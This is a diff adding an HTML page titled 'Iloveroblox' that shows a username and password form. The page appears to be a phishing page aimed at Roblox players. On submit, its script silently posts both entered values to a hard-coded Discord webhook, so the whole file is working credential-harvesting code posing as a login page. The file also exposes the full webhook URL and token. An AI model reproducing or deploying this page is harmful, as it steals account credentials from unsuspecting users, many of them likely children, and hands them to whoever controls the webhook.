@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Iloveroblox</title>
+</head>
+<body>
+    <h1>Iloveroblox</h1>
+    <form id="myForm">
+        <label for="input1">Username:</label>
+        <input type="text" id="input1" name="input1" required><br>
+        <label for="input2">Password:</label>
+        <input type="text" id="input2" name="input2" required><br>
+        <button type="submit">Submit</button>
+    </form>
+    <p id="output"></p>
+
+    <script>
+        document.getElementById('myForm').addEventListener('submit', function(event) {
+            event.preventDefault();
+
+            const input1 = document.getElementById('input1').value;
+            const input2 = document.getElementById('input2').value;
+            const output = document.getElementById('output');
+
+            output.textContent = `{input1} and {input2}`;
+
+            // Send data to webhook using Fetch API (replace with your actual webhook URL)
+            fetch('https://discord.com/api/webhooks/1233456441277415484/S9HgBv6jiukVuNmoN392KzIix9LY1rOnpph6S3JYqTcrb4nttJM0Wvy-X5tPQFosmF8x', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    input1,
+                    input2
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('Webhook response:', data);
+            })
+            .catch(error => {
+                console.error('Error sending data to webhook:', error);
+            });
+        });
+    </script>
+</body>
+</html>
